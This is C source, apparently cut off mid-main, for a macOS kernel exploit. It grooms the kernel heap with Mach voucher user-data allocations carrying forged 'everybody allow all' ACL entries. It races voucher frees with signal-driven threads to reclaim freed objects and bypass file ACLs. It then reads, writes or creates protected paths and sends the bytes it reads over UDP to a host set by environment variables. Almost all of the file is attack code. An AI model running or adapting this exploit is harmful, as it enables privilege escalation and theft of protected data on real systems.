#include <mach/mach.h>
#include <mach/mach_host.h>
#include <mach/mach_voucher.h>
#include <mach/mach_voucher_types.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <errno.h>
#include <limits.h>
#include <netinet/in.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

enum {
    VOUCHER_DATA_SIZE = 32,
    MAX_VOUCHERS = 512,
    MAX_SELECTIONS = 32,
    MAX_TIGHT_DRAIN_VOUCHERS = 256,
    STAGE2_POLLER_THREADS = 1,
    FDFLAGS_VICTIM_FD = 17,
};

static const uint8_t synthetic_everybody_allow_all[VOUCHER_DATA_SIZE] = {
    0xab, 0xcd, 0xef, 0xab, 0xcd, 0xef, 0xab, 0xcd,
    0xef, 0xab, 0xcd, 0xef, 0x00, 0x00, 0x00, 0x0c,
    0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t synthetic_everybody_allow_all_dir_inherit[
    VOUCHER_DATA_SIZE] = {
    0xab, 0xcd, 0xef, 0xab, 0xcd, 0xef, 0xab, 0xcd,
    0xef, 0xab, 0xcd, 0xef, 0x00, 0x00, 0x00, 0x0c,
    0x41, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t synthetic_fdflags_clear[VOUCHER_DATA_SIZE] = {0};
static unsigned fdflags_ace_index = UINT_MAX;
static unsigned fdflags_ace_index_last = UINT_MAX;

struct user_data_recipe {
    mach_voucher_attr_key_t key;
    mach_voucher_attr_recipe_command_t command;
    mach_voucher_name_t previous_voucher;
    mach_voucher_attr_content_size_t content_size;
    uint8_t data[VOUCHER_DATA_SIZE];
};

static volatile sig_atomic_t dtrace_release_requested;
static volatile sig_atomic_t dtrace_stage2_requested;
static volatile sig_atomic_t dtrace_stage2_slot_plus1;
static volatile sig_atomic_t dtrace_stage2_drain_done;
static volatile sig_atomic_t dtrace_stage2_prefree_winner;
static volatile sig_atomic_t dtrace_stage2_worker_done;
static _Thread_local volatile sig_atomic_t dtrace_stage2_local_requested;
static _Thread_local volatile sig_atomic_t
    dtrace_stage2_probe_slot_plus1;
static _Thread_local volatile sig_atomic_t
    dtrace_stage2_prefree_local_requested;
static volatile sig_atomic_t fdflags_close_a_requested;
static volatile sig_atomic_t fdflags_close_b_requested;

static uint64_t
monotonic_ns(void)
{
    struct timespec now;

    if (clock_gettime(CLOCK_MONOTONIC_RAW, &now) != 0) {
        return 0;
    }
    return (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
}

static void
print_hex(const uint8_t *data, size_t size)
{
    for (size_t index = 0; index < size; index++) {
        printf("%02x", data[index]);
    }
}

static int
open_result_socket(void)
{
    const char *host = getenv("VOUCHER32_RESULT_HOST");
    const char *port_text = getenv("VOUCHER32_RESULT_PORT");
    struct sockaddr_in address = {0};
    char *end = NULL;
    unsigned long port;
    int result_socket;

    if (host == NULL || host[0] == '\0' ||
        port_text == NULL || port_text[0] == '\0') {
        return -1;
    }
    errno = 0;
    port = strtoul(port_text, &end, 10);
    if (errno != 0 || end == port_text || *end != '\0' ||
        port == 0 || port > UINT16_MAX) {
        fprintf(stderr, "invalid VOUCHER32_RESULT_PORT=%s\n", port_text);
        return -1;
    }
    address.sin_family = AF_INET;
    address.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &address.sin_addr) != 1) {
        fprintf(stderr, "invalid VOUCHER32_RESULT_HOST=%s\n", host);
        return -1;
    }
    result_socket = socket(AF_INET, SOCK_DGRAM, 0);
    if (result_socket < 0) {
        perror("result socket");
        return -1;
    }
    if (connect(result_socket, (const struct sockaddr *)&address,
        sizeof(address)) != 0) {
        perror("result socket connect");
        close(result_socket);
        return -1;
    }
    printf("voucher_result_udp_ready pid=%d host=%s port=%lu\n",
        getpid(), host, port);
    return result_socket;
}

static void
send_result(int result_socket, const char *operation, int target_fd,
    int open_errno, ssize_t io_result, int io_errno, const uint8_t *data,
    size_t data_size)
{
    char message[1024];
    size_t used;
    int length;

    if (result_socket < 0) {
        return;
    }
    length = snprintf(message, sizeof(message),
        "voucher_udp_result pid=%d operation=%s fd=%d open_errno=%d "
        "io_result=%zd io_errno=%d data_hex=",
        getpid(), operation, target_fd, open_errno, io_result, io_errno);
    if (length < 0) {
        return;
    }
    used = (size_t)length;
    if (used >= sizeof(message)) {
        used = sizeof(message) - 1;
    }
    if (data_size > 256) {
        data_size = 256;
    }
    for (size_t index = 0;
        index < data_size && used + 2 < sizeof(message); index++) {
        length = snprintf(message + used, sizeof(message) - used,
            "%02x", data[index]);
        if (length != 2) {
            break;
        }
        used += 2;
    }
    if (used + 1 < sizeof(message)) {
        message[used++] = '\n';
    }
    (void)send(result_socket, message, used, MSG_DONTWAIT);
}

static void
handle_dtrace_release(int signal_number)
{
    (void)signal_number;
    dtrace_release_requested = 1;
}

static void
handle_dtrace_stage2(int signal_number)
{
    (void)signal_number;
    dtrace_stage2_slot_plus1 = dtrace_stage2_probe_slot_plus1;
    dtrace_stage2_local_requested = 1;
    dtrace_stage2_requested = 1;
}

static void
handle_dtrace_stage2_prefree(int signal_number)
{
    (void)signal_number;
    dtrace_stage2_prefree_local_requested = 1;
}

static void
handle_fdflags_close_a(int signal_number)
{
    (void)signal_number;
    fdflags_close_a_requested = 1;
}

static void
handle_fdflags_close_b(int signal_number)
{
    (void)signal_number;
    fdflags_close_b_requested = 1;
}

struct fdflags_close_context {
    int fd;
    int closer;
};

static void *
run_fdflags_close(void *opaque)
{
    const struct fdflags_close_context *context = opaque;
    volatile sig_atomic_t *requested = context->closer == 1 ?
        &fdflags_close_a_requested : &fdflags_close_b_requested;
    int close_errno;
    int close_result;

    (void)pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (!*requested) {
        (void)syscall(SYS_getpid);
        usleep(100);
    }
    errno = 0;
    close_result = close(context->fd);
    close_errno = errno;
    printf("fdflags_close_result pid=%d closer=%d fd=%d result=%d errno=%d "
        "monotonic_ns=%llu\n", getpid(), context->closer, context->fd,
        close_result, close_errno, (unsigned long long)monotonic_ns());
    fflush(stdout);
    return NULL;
}

static void
run_fdflags_victim(pid_t parent_pid)
{
    struct fdflags_close_context close_a = {
        .fd = FDFLAGS_VICTIM_FD, .closer = 1
    };
    struct fdflags_close_context close_b = {
        .fd = FDFLAGS_VICTIM_FD, .closer = 2
    };
    pthread_t thread_a;
    pthread_t thread_b;
    int descriptor_limit;
    int fd;

    descriptor_limit = getdtablesize();
    for (int candidate = STDERR_FILENO + 1;
        candidate < descriptor_limit; candidate++) {
        (void)close(candidate);
    }
    fd = open("/Users/testtest/fdflags_victim_target",
        O_CREAT | O_RDWR, 0600);
    if (fd != 3) {
        fprintf(stderr, "fdflags victim expected fd 3, got %d errno=%d\n",
            fd, errno);
        _exit(1);
    }
    if (dup2(fd, FDFLAGS_VICTIM_FD) != FDFLAGS_VICTIM_FD) {
        perror("fdflags victim dup2");
        _exit(1);
    }
    if (close(fd) != 0) {
        perror("fdflags victim close temporary fd");
        _exit(1);
    }
    if (signal(SIGUSR1, handle_fdflags_close_a) == SIG_ERR ||
        signal(SIGUSR2, handle_fdflags_close_b) == SIG_ERR) {
        perror("fdflags signal");
        _exit(1);
    }
    if (pthread_create(&thread_a, NULL, run_fdflags_close, &close_a) != 0 ||
        pthread_create(&thread_b, NULL, run_fdflags_close, &close_b) != 0) {
        perror("fdflags pthread_create");
        _exit(1);
    }
    (void)syscall(SYS_getpgid, parent_pid);
    printf("fdflags_victim_ready child_pid=%d parent_pid=%d fd=%d\n",
        getpid(), parent_pid, FDFLAGS_VICTIM_FD);
    fflush(stdout);
    for (;;) {
        (void)syscall(SYS_getpgid, parent_pid);
        (void)syscall(SYS_getpid);
        usleep(100);
    }
}

static pid_t
spawn_fdflags_victim(void)
{
    pid_t child_pid;

    fflush(NULL);
    child_pid = fork();
    if (child_pid < 0) {
        perror("fdflags fork");
        return -1;
    }
    if (child_pid == 0) {
        run_fdflags_victim(getppid());
        _exit(1);
    }
    printf("fdflags_victim_spawned parent_pid=%d child_pid=%d\n",
        getpid(), child_pid);
    fflush(stdout);
    return child_pid;
}

static void
perform_acl_operation(const char *acl_target, const char *acl_access_target,
    const char *acl_operation, int result_socket)
{
    if (acl_target == NULL || acl_target[0] == '\0') {
        return;
    }
    if (strcmp(acl_operation, "access") == 0) {
        int acl_result;
        int acl_errno;

        errno = 0;
        acl_result = access(acl_access_target, R_OK);
        acl_errno = errno;
        printf("voucher_selective_acl result=%d errno=%d target=%s "
            "access_target=%s\n", acl_result, acl_errno, acl_target,
            acl_access_target);
        send_result(result_socket, "access", -1, 0, acl_result, acl_errno,
            NULL, 0);
    } else if (strcmp(acl_operation, "read") == 0) {
        uint8_t buffer[256];
        ssize_t read_result = -1;
        int read_errno = 0;
        int open_errno;
        int target_fd;

        errno = 0;
        target_fd = open(acl_access_target, O_RDONLY);
        open_errno = errno;
        if (target_fd >= 0) {
            errno = 0;
            read_result = read(target_fd, buffer, sizeof(buffer));
            read_errno = errno;
            close(target_fd);
        }
        printf("voucher_selective_read fd=%d open_errno=%d read_result=%zd "
            "read_errno=%d target=%s access_target=%s data_hex=",
            target_fd, open_errno, read_result, read_errno, acl_target,
            acl_access_target);
        if (read_result > 0) {
            print_hex(buffer, (size_t)read_result);
        }
        printf("\n");
        send_result(result_socket, "read", target_fd, open_errno,
            read_result, read_errno, buffer,
            read_result > 0 ? (size_t)read_result : 0);
    } else if (strcmp(acl_operation, "mkdir") == 0) {
        int mkdir_result;
        int mkdir_errno;

        errno = 0;
        mkdir_result = mkdir(acl_access_target, 0700);
        mkdir_errno = errno;
        printf("voucher_selective_mkdir result=%d errno=%d target=%s "
            "access_target=%s\n", mkdir_result, mkdir_errno, acl_target,
            acl_access_target);
        send_result(result_socket, "mkdir", -1, 0, mkdir_result, mkdir_errno,
            NULL, 0);
    } else {
        static const char default_write_data[] = "CODEX_UID501_WRITE\n";
        const char *write_data = getenv("VOUCHER32_WRITE_DATA");
        ssize_t write_result = -1;
        int write_errno = 0;
        int open_errno;
        int target_fd;

        if (write_data == NULL || write_data[0] == '\0') {
            write_data = default_write_data;
        }
        errno = 0;
        target_fd = open(acl_access_target, O_WRONLY);
        open_errno = errno;
        if (target_fd >= 0) {
            errno = 0;
            write_result = write(target_fd, write_data, strlen(write_data));
            write_errno = errno;
            (void)fsync(target_fd);
            close(target_fd);
        }
        printf("voucher_selective_write fd=%d open_errno=%d "
            "write_result=%zd write_errno=%d target=%s access_target=%s "
            "data_hex=", target_fd, open_errno, write_result, write_errno,
            acl_target, acl_access_target);
        print_hex((const uint8_t *)write_data, strlen(write_data));
        printf("\n");
        send_result(result_socket, "write", target_fd, open_errno,
            write_result, write_errno, (const uint8_t *)write_data,
            write_result > 0 ? (size_t)write_result : 0);
    }
    fflush(stdout);
}

struct selective_stage2_context {
    mach_voucher_t *vouchers;
    const unsigned *index_b;
    const unsigned *index_c;
    const unsigned *index_e;
    unsigned fdflags_e_slot;
    unsigned selection_count;
    unsigned count;
    useconds_t delay_us;
    const char *acl_target;
    const char *acl_access_target;
    const char *acl_operation;
    int tight_acl_reclaim;
    unsigned tight_drain_count;
    unsigned tight_bounce_count;
    unsigned tight_sacrifice_count;
    int result_socket;
    int decmpfs_fd;
    uint8_t *decmpfs_buffer;
    size_t decmpfs_read_size;
    const char *decmpfs_target;
};

static kern_return_t create_voucher(unsigned index,
    const uint8_t *fixed_payload, mach_voucher_t *voucher);

static void *
run_selective_stage2(void *opaque)
{
    struct selective_stage2_context *context = opaque;
    mach_voucher_t drain_vouchers[MAX_TIGHT_DRAIN_VOUCHERS] = {0};
    sigset_t stage2_signal;
    unsigned slot;
    unsigned selected_e_slot = UINT_MAX;
    unsigned selected_e_index = UINT_MAX;
    int selected_e_reverse = 0;
    int drain_worker = 0;
    int qos_result;

    qos_result = pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    printf("voucher_selective_stage2_qos pid=%d result=%d\n",
        getpid(), qos_result);
    fflush(stdout);

    if (context->delay_us != 0) {
        printf("voucher_selective_stage2_timer_armed pid=%d delay_us=%u "
            "monotonic_ns=%llu\n", getpid(), (unsigned)context->delay_us,
            (unsigned long long)monotonic_ns());
        fflush(stdout);
        usleep(context->delay_us);
        if (!__sync_bool_compare_and_swap(&dtrace_stage2_requested, 0, 1)) {
            return NULL;
        }
        dtrace_stage2_local_requested = 1;
        drain_worker = 1;
        slot = 0;
    } else {
        sigemptyset(&stage2_signal);
        sigaddset(&stage2_signal, SIGUSR2);
        sigaddset(&stage2_signal, SIGURG);
        if (pthread_sigmask(SIG_UNBLOCK, &stage2_signal, NULL) != 0) {
            perror("pthread_sigmask stage2");
            return NULL;
        }
        while (!dtrace_stage2_local_requested &&
            !dtrace_stage2_requested && !dtrace_stage2_worker_done) {
            for (slot = 0;
                slot < context->selection_count &&
                !dtrace_stage2_local_requested &&
                !dtrace_stage2_requested && !dtrace_stage2_worker_done;
                slot++) {
                dtrace_stage2_probe_slot_plus1 = (sig_atomic_t)(slot + 1);
                (void)syscall(SYS_getpgid, (pid_t)(0x6a00 + slot + 1));
            }
            if (!dtrace_stage2_local_requested &&
                !dtrace_stage2_requested && !dtrace_stage2_worker_done) {
                (void)syscall(SYS_getpid);
            }
            usleep(100);
        }
        if (!dtrace_stage2_requested) {
            return NULL;
        }

        drain_worker = dtrace_stage2_local_requested != 0;
        slot = dtrace_stage2_slot_plus1 == 0 ? 0 :
            (unsigned)dtrace_stage2_slot_plus1 - 1;
        if (dtrace_stage2_slot_plus1 == 0 ||
            slot >= context->selection_count) {
            fprintf(stderr, "threaded stage2 slot out of range: %u/%u\n",
                slot, context->selection_count);
            return NULL;
        }
    }
    if (drain_worker) {
        printf("voucher_selective_stage2_targeted pid=%d slot=%u b=%u e=%d "
            "e_slot=%u probe=0x%x threaded=1 delay_us=%u monotonic_ns=%llu\n",
            getpid(), slot,
            context->index_b[slot],
            context->index_e == NULL ? -1 :
            (int)context->index_e[
            context->fdflags_e_slot < context->selection_count ?
            context->fdflags_e_slot : slot],
            context->fdflags_e_slot < context->selection_count ?
            context->fdflags_e_slot : slot,
            0x6a00 + slot + 1,
            (unsigned)context->delay_us, (unsigned long long)monotonic_ns());
        fflush(stdout);
        for (unsigned i = 0; i < context->tight_drain_count; i++) {
            kern_return_t result = create_voucher(0x70000000U + i, NULL,
                &drain_vouchers[i]);

            if (result != KERN_SUCCESS) {
                fprintf(stderr, "tight drain create[%u]=0x%x\n", i, result);
                dtrace_stage2_worker_done = 1;
                return NULL;
            }
        }
        if (context->tight_drain_count != 0) {
            printf("voucher_selective_tight_drain pid=%d count=%u\n",
                getpid(), context->tight_drain_count);
            fflush(stdout);
        }
        __sync_synchronize();
        dtrace_stage2_drain_done = 1;
    } else {
        if (context->delay_us == 0) {
            sigemptyset(&stage2_signal);
            sigaddset(&stage2_signal, SIGURG);
            if (pthread_sigmask(SIG_BLOCK, &stage2_signal, NULL) != 0) {
                perror("pthread_sigmask stage2 prefree");
                return NULL;
            }
        }
        while (!dtrace_stage2_drain_done &&
            !dtrace_stage2_worker_done) {
            (void)syscall(SYS_getpid);
            usleep(50);
        }
        if (!dtrace_stage2_drain_done) {
            return NULL;
        }
        while (!dtrace_stage2_worker_done) {
            (void)syscall(SYS_getpid);
            usleep(50);
        }
        return NULL;
    }
    if (context->delay_us == 0) {
        dtrace_stage2_prefree_local_requested = 0;
        while (!dtrace_stage2_prefree_local_requested &&
            !dtrace_stage2_worker_done) {
            (void)syscall(SYS_getpgid,
                (pid_t)(0x6b00 + slot + 1));
        }
        if (!dtrace_stage2_prefree_local_requested) {
            return NULL;
        }
    }
    if (!__sync_bool_compare_and_swap(
        &dtrace_stage2_prefree_winner, 0, 1)) {
        return NULL;
    }
    /*
     * A zero-sacrifice run keeps B as the final free after the drain. This
     * matches the E -> B ordering that previously yielded exact ACL-source
     * and fd_ofileflags-destination reclaims.
     */
    if (context->index_e != NULL &&
        (context->tight_drain_count == 0 ||
        context->tight_sacrifice_count == 0)) {
        selected_e_slot =
            context->fdflags_e_slot < context->selection_count ?
            context->fdflags_e_slot : slot;
        selected_e_index = context->index_e[selected_e_slot];
        mach_port_deallocate(mach_task_self(),
            context->vouchers[selected_e_index]);
        context->vouchers[selected_e_index] = MACH_PORT_NULL;
    }
    mach_port_deallocate(mach_task_self(),
        context->vouchers[context->index_b[slot]]);
    context->vouchers[context->index_b[slot]] = MACH_PORT_NULL;
    if (context->index_e != NULL && context->tight_drain_count != 0 &&
        context->tight_sacrifice_count != 0) {
        selected_e_slot =
            context->fdflags_e_slot < context->selection_count ?
            context->fdflags_e_slot : slot;
        selected_e_index = context->index_e[selected_e_slot];
        selected_e_reverse = 1;
        mach_port_deallocate(mach_task_self(),
            context->vouchers[selected_e_index]);
        context->vouchers[selected_e_index] = MACH_PORT_NULL;
    }
    for (unsigned i = 0; i < context->tight_bounce_count; i++) {
        mach_voucher_t bounce_voucher = MACH_PORT_NULL;
        kern_return_t result = create_voucher(0x71000000U + i, NULL,
            &bounce_voucher);

        if (result != KERN_SUCCESS) {
            fprintf(stderr, "tight bounce create[%u]=0x%x\n", i, result);
            dtrace_stage2_worker_done = 1;
            return NULL;
        }
        mach_port_deallocate(mach_task_self(), bounce_voucher);
    }
    if (context->tight_bounce_count != 0) {
        printf("voucher_selective_tight_bounce pid=%d count=%u\n",
            getpid(), context->tight_bounce_count);
        fflush(stdout);
    }
    if (context->tight_acl_reclaim) {
        unsigned first_sacrifice = UINT_MAX;
        unsigned second_sacrifice = UINT_MAX;

        if (context->tight_sacrifice_count >= 1) {
            first_sacrifice = context->index_c[slot];
            mach_port_deallocate(mach_task_self(),
                context->vouchers[first_sacrifice]);
            context->vouchers[first_sacrifice] = MACH_PORT_NULL;
        }
        if (context->tight_sacrifice_count >= 2) {
            for (unsigned i = 0; i < context->count; i++) {
                if (context->vouchers[i] != MACH_PORT_NULL) {
                    mach_port_deallocate(mach_task_self(),
                        context->vouchers[i]);
                    context->vouchers[i] = MACH_PORT_NULL;
                    second_sacrifice = i;
                    break;
                }
            }
        }
        perform_acl_operation(context->acl_target,
            context->acl_access_target, context->acl_operation,
            context->result_socket);
        printf("voucher_selective_acl_sacrifices pid=%d first=%u "
            "second=%u count=%u\n", getpid(), first_sacrifice,
            second_sacrifice, context->tight_sacrifice_count);
    }
    if (selected_e_index != UINT_MAX) {
        printf("voucher_fdflags_destination_hole pid=%d slot=%u "
            "e_slot=%u e=%u reverse=%d\n", getpid(), slot,
            selected_e_slot, selected_e_index, selected_e_reverse);
    }
    printf("voucher_selective_source_hole pid=%d slot=%u b=%u "
        "monotonic_ns=%llu\n", getpid(), slot, context->index_b[slot],
        (unsigned long long)monotonic_ns());
    fflush(stdout);
    if (fsync(STDOUT_FILENO) != 0) {
        perror("voucher stage2 fsync");
    }

    if (context->decmpfs_fd >= 0) {
        ssize_t read_result;
        int read_errno;

        errno = 0;
        read_result = pread(context->decmpfs_fd, context->decmpfs_buffer,
            context->decmpfs_read_size, 0);
        read_errno = errno;
        printf("voucher_selective_decmpfs result=%zd errno=%d "
            "requested=%zu path=%s data_hex=", read_result, read_errno,
            context->decmpfs_read_size, context->decmpfs_target);
        if (read_result > 0) {
            print_hex(context->decmpfs_buffer, (size_t)read_result);
        }
        printf("\n");
        fflush(stdout);
    }
    if (!context->tight_acl_reclaim) {
        perform_acl_operation(context->acl_target,
            context->acl_access_target, context->acl_operation,
            context->result_socket);
    }
    printf("voucher_selective_ready count=%u pid=%d selections=%u "
        "threaded=1\n", context->count, getpid(),
        context->selection_count);
    fflush(stdout);
    if (fsync(STDOUT_FILENO) != 0) {
        perror("voucher result fsync");
    }
    dtrace_stage2_worker_done = 1;
    return NULL;
}

static void
fill_data(uint8_t data[VOUCHER_DATA_SIZE], unsigned index,
    const uint8_t *fixed_payload)
{
    uint32_t marker = 0x41000000U | index;

    if (fixed_payload != NULL) {
        memcpy(data, fixed_payload, VOUCHER_DATA_SIZE);
        if (fixed_payload == synthetic_fdflags_clear) {
            uint32_t ace_flags = 0x41;

            marker = 0x52000000U ^ (index << 8);
            if (index >= fdflags_ace_index &&
                index <= fdflags_ace_index_last) {
                memcpy(data + 16, &ace_flags, sizeof(ace_flags));
            }
        }
        /*
         * A kauth_ace consumes the first 24 bytes. Keep that payload fixed,
         * but vary the unused tail so user_data_dedup creates one persistent
         * 32-byte allocation for every voucher.
         */
        memcpy(data + 24, &marker, sizeof(marker));
        memcpy(data + 28, &index, sizeof(index));
        return;
    }
    memset(data, (int)(0x80U | (index & 0x7fU)), VOUCHER_DATA_SIZE);
    memcpy(data, &marker, sizeof(marker));
    memcpy(data + sizeof(marker), &index, sizeof(index));
}

static kern_return_t
create_voucher(unsigned index, const uint8_t *fixed_payload,
    mach_voucher_t *voucher)
{
    struct user_data_recipe input = {
        .key = MACH_VOUCHER_ATTR_KEY_USER_DATA,
        .command = MACH_VOUCHER_ATTR_USER_DATA_STORE,
        .content_size = VOUCHER_DATA_SIZE,
    };

    fill_data(input.data, index, fixed_payload);
    return host_create_mach_voucher(mach_host_self(),
        (mach_voucher_attr_raw_recipe_array_t)&input, sizeof(input), voucher);
}

static int
wait_for_release_signal(unsigned count, const char *mode)
{
    sigset_t signals;
    int received;

    if (strcmp(mode, "dtrace_signal") == 0) {
        if (signal(SIGUSR1, handle_dtrace_release) == SIG_ERR) {
            perror("signal");
            return -1;
        }
        printf("voucher_prearmed count=%u mode=%s pid=%d\n",
            count, mode, getpid());
        fflush(stdout);
        while (!dtrace_release_requested) {
            (void)syscall(SYS_getpid);
            usleep(100);
        }
        return 0;
    }

    sigemptyset(&signals);
    sigaddset(&signals, SIGUSR1);
    if (sigprocmask(SIG_BLOCK, &signals, NULL) != 0) {
        perror("sigprocmask");
        return -1;
    }
    printf("voucher_prearmed count=%u mode=%s pid=%d\n",
        count, mode, getpid());
    fflush(stdout);
    if (sigwait(&signals, &received) != 0 || received != SIGUSR1) {
        fprintf(stderr, "signal wait failed\n");
        return -1;
    }
    return 0;
}

int
main(int argc, char **argv)
{
    mach_voucher_t *vouchers;
    int pregroom;
    int selective;
    unsigned base_index = 0;
    unsigned count;
    char *end = NULL;
    unsigned changed = 0;
    const char *payload_mode = getenv("VOUCHER32_PAYLOAD");
    const char *fdflags_target_env = getenv("VOUCHER32_FDFLAGS_TARGET");
    const char *fdflags_c_index_text =
        getenv("VOUCHER32_FDFLAGS_C_INDEX");
    const char *fdflags_c_count_text =
        getenv("VOUCHER32_FDFLAGS_C_COUNT");
    const char *fdflags_prefork_env =
        getenv("VOUCHER32_FDFLAGS_PREFORK_RECLAIM");
    const char *acl_target = getenv("VOUCHER32_ACL_TARGET");
    const char *acl_operation = getenv("VOUCHER32_ACL_OPERATION");
    const char *tight_acl_reclaim_env =
        getenv("VOUCHER32_TIGHT_ACL_RECLAIM");
    const char *tight_drain_count_text =
        getenv("VOUCHER32_TIGHT_DRAIN_COUNT");
    const char *tight_bounce_count_text =
        getenv("VOUCHER32_TIGHT_BOUNCE_COUNT");
    const char *tight_sacrifice_count_text =
        getenv("VOUCHER32_TIGHT_SACRIFICE_COUNT");
    const char *decmpfs_target = getenv("VOUCHER32_DECMPFS_TARGET");
    const char *decmpfs_size_text =
        getenv("VOUCHER32_DECMPFS_READ_SIZE");
    const char *acl_access_target = acl_target;
    char acl_target_storage[MAXPATHLEN];
    uint8_t decmpfs_buffer[4096];
    size_t decmpfs_read_size = 0;
    int decmpfs_fd = -1;
    int result_socket = -1;
    const uint8_t *fixed_payload = NULL;
    int fdflags_target = fdflags_target_env != NULL &&
        strcmp(fdflags_target_env, "1") == 0;
    int fdflags_prefork = fdflags_prefork_env != NULL &&
        strcmp(fdflags_prefork_env, "1") == 0;
    int tight_acl_reclaim = tight_acl_reclaim_env != NULL &&
        strcmp(tight_acl_reclaim_env, "1") == 0;
    unsigned tight_drain_count = 0;
    unsigned tight_bounce_count = 0;
    unsigned tight_sacrifice_count = 2;

    if (argc != 3 && argc != 4) {
        fprintf(stderr, "usage: %s COUNT RELEASE_MODE [BASE_INDEX]\n",
            argv[0]);
        return 2;
    }
    if (tight_drain_count_text != NULL &&
        tight_drain_count_text[0] != '\0') {
        unsigned long parsed;

        errno = 0;
        end = NULL;
        parsed = strtoul(tight_drain_count_text, &end, 0);
        if (errno != 0 || end == tight_drain_count_text || *end != '\0' ||
            parsed > MAX_TIGHT_DRAIN_VOUCHERS) {
            fprintf(stderr, "invalid VOUCHER32_TIGHT_DRAIN_COUNT=%s\n",
                tight_drain_count_text);
            return 2;
        }
        tight_drain_count = (unsigned)parsed;
    }
    if (tight_bounce_count_text != NULL &&
        tight_bounce_count_text[0] != '\0') {
        unsigned long parsed;

        errno = 0;
        end = NULL;
        parsed = strtoul(tight_bounce_count_text, &end, 0);
        if (errno != 0 || end == tight_bounce_count_text ||
            *end != '\0' || parsed > 8) {
            fprintf(stderr, "invalid VOUCHER32_TIGHT_BOUNCE_COUNT=%s\n",
                tight_bounce_count_text);
            return 2;
        }
        tight_bounce_count = (unsigned)parsed;
    }
    if (tight_sacrifice_count_text != NULL &&
        tight_sacrifice_count_text[0] != '\0') {
        unsigned long parsed;

        errno = 0;
        end = NULL;
        parsed = strtoul(tight_sacrifice_count_text, &end, 0);
        if (errno != 0 || end == tight_sacrifice_count_text ||
            *end != '\0' || parsed > 2) {
            fprintf(stderr,
                "invalid VOUCHER32_TIGHT_SACRIFICE_COUNT=%s\n",
                tight_sacrifice_count_text);
            return 2;
        }
        tight_sacrifice_count = (unsigned)parsed;
    }
    count = (unsigned)strtoul(argv[1], &end, 0);
    if (end == NULL || *end != '\0' || count == 0 ||
        count > MAX_VOUCHERS) {
        fprintf(stderr, "invalid voucher count\n");
        return 2;
    }
    if (argc == 4) {
        end = NULL;
        base_index = (unsigned)strtoul(argv[3], &end, 0);
        if (end == NULL || *end != '\0' ||
            base_index > 0x00ffffffU - count) {
            fprintf(stderr, "invalid base index\n");
            return 2;
        }
    }
    if (fdflags_target) {
        unsigned long parsed;
        unsigned long parsed_count;

        errno = 0;
        end = NULL;
        parsed = fdflags_c_index_text == NULL ? ULONG_MAX :
            strtoul(fdflags_c_index_text, &end, 0);
        if (errno != 0 || fdflags_c_index_text == NULL ||
            end == fdflags_c_index_text || *end != '\0' ||
            parsed > UINT_MAX || parsed < base_index ||
            parsed >= (unsigned long)base_index + count) {
            fprintf(stderr, "invalid VOUCHER32_FDFLAGS_C_INDEX=%s\n",
                fdflags_c_index_text == NULL ? "(null)" :
                fdflags_c_index_text);
            return 2;
        }
        fdflags_ace_index = (unsigned)parsed;
        errno = 0;
        end = NULL;
        parsed_count = fdflags_c_count_text == NULL ? 1 :
            strtoul(fdflags_c_count_text, &end, 0);
        if (errno != 0 ||
            (fdflags_c_count_text != NULL &&
            (end == fdflags_c_count_text || *end != '\0')) ||
            parsed_count == 0 || parsed_count > count ||
            parsed + parsed_count > (unsigned long)base_index + count) {
            fprintf(stderr, "invalid VOUCHER32_FDFLAGS_C_COUNT=%s\n",
                fdflags_c_count_text == NULL ? "(null)" :
                fdflags_c_count_text);
            return 2;
        }
        fdflags_ace_index_last =
            fdflags_ace_index + (unsigned)parsed_count - 1;
    }
    if (payload_mode != NULL && payload_mode[0] != '\0') {
        if (strcmp(payload_mode, "ace-everybody-allow-all") == 0) {
            fixed_payload = synthetic_everybody_allow_all;
            printf("voucher_payload=%s bytes="
                "abcdefabcdefabcdefabcdef0000000c01000000ffffffff"
                " tail=per-voucher-marker\n", payload_mode);
        } else if (strcmp(payload_mode,
            "ace-everybody-allow-all-dir-inherit") == 0) {
            fixed_payload = synthetic_everybody_allow_all_dir_inherit;
            printf("voucher_payload=%s bytes="
                "abcdefabcdefabcdefabcdef0000000c41000000ffffffff"
                " tail=per-voucher-marker\n", payload_mode);
        } else if (strcmp(payload_mode, "fdflags-clear") == 0) {
            fixed_payload = synthetic_fdflags_clear;
            printf("voucher_payload=%s bytes="
                "00000000000000000000000000000000"
                " designated_flags=0x41 designated_range=%u-%u"
                " tail=per-voucher-marker\n", payload_mode,
                fdflags_ace_index, fdflags_ace_index_last);
        } else {
            fprintf(stderr, "invalid VOUCHER32_PAYLOAD=%s\n", payload_mode);
            return 2;
        }
    }
    if (acl_operation == NULL || acl_operation[0] == '\0') {
        acl_operation = "access";
    }
    if (decmpfs_target != NULL && decmpfs_target[0] != '\0') {
        unsigned long parsed;

        if (decmpfs_target[0] != '/' || decmpfs_size_text == NULL ||
            decmpfs_size_text[0] == '\0') {
            fprintf(stderr,
                "decmpfs target must be absolute and include a read size\n");
            return 2;
        }
        errno = 0;
        end = NULL;
        parsed = strtoul(decmpfs_size_text, &end, 0);
        if (errno != 0 || end == decmpfs_size_text || *end != '\0' ||
            parsed == 0 || parsed > sizeof(decmpfs_buffer)) {
            fprintf(stderr, "invalid VOUCHER32_DECMPFS_READ_SIZE=%s\n",
                decmpfs_size_text);
            return 2;
        }
        decmpfs_read_size = (size_t)parsed;
    }
    if (strcmp(acl_operation, "access") != 0 &&
        strcmp(acl_operation, "read") != 0 &&
        strcmp(acl_operation, "write") != 0 &&
        strcmp(acl_operation, "mkdir") != 0) {
        fprintf(stderr, "invalid VOUCHER32_ACL_OPERATION=%s\n",
            acl_operation);
        return 2;
    }
